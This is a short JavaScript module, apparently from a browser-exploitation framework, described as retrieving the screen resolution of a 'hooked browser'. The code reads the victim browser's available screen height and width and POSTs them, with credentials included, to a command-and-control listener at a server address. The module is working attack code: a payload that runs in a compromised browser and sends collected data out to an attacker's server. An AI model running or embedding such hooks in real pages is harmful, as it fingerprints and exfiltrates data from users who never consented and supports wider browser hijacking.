/*
Module to retrieve the hooked browser screen resolution
*/

(function getScreenResolution() {
    let formData = new FormData();
    formData.append('result', `${window.screen.availHeight}x${window.screen.availWidth}`);
    formData.append('module_value', 'screen_resolution.js')

    fetch(`http://${serverAddress}/command/result_listener`, {
        method: "POST",
        mode: 'cors',
        credentials: "include",
        body: formData
    })
})()